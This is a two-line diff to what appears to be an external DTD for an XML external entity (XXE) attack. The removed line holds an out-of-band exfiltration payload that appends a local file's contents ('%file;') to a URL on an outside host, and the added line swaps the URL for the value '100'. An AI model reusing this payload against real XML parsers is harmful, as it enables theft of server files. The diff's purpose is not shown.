@@ -1,2 +1,2 @@
-<!ENTITY % all "<!ENTITY send SYSTEM 'https://dalexey.pythonanywhere.com/data=%file;'>">
+<!ENTITY % all "<!ENTITY send SYSTEM '100'>">
 %all;
